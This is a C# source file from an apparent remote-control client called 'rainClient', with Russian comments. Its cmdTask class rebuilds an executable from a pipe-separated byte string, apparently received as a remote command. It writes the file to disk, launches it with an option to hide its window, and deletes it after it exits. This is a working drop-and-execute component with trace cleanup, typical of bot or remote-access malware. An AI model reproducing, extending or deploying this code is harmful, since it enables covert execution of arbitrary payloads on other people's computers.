using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace rainClient.task
{
    class cmdTask : baseTask
    {
        private string fileName { get; set; }
        private bool delete { get; set; }
        private bool vizible { get; set; }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="fileName">название файла с расширением</param>
        /// <param name="vizible">true - запускает cmd в видимом режиме, false - в невидимом режиме</param>
        /// <param name="delete">true - удалят скаченный файл, false - не удаляет скаченный файл</param>
        public cmdTask(string fileName, string vizible, string delete)
        {
            this.fileName = fileName;
            this.vizible = bool.Parse(vizible);
            this.delete = bool.Parse(delete);
        }

        public override void startProces(string atribute)
        {
            List<byte> file = new List<byte>();
            foreach (string i in atribute.Split('|'))
            {
                if (byte.TryParse(i, out byte result))
                    file.Add(result);
            }

            using (FileStream fs = new FileStream(GO.puth + "\\" + fileName, FileMode.Create))
            {                    
                fs.Write(file.ToArray(), 0, file.Count);
            }

            Process myProcess = new Process();
            myProcess.StartInfo.FileName = GO.puth + "\\" + fileName;
            myProcess.StartInfo.WindowStyle = vizible ? ProcessWindowStyle.Normal : ProcessWindowStyle.Hidden;
            myProcess.StartInfo.CreateNoWindow = vizible;                    
            myProcess.Start();

            if (delete)
                Task.Run(() => 
                {
                    try
                    {
                        while (!myProcess.HasExited)
                        {
                            System.Threading.Thread.Sleep(100);
                        }
                        File.Delete(GO.puth + "\\" + fileName);
                    }
                    catch { }
                });
        }
    }
}
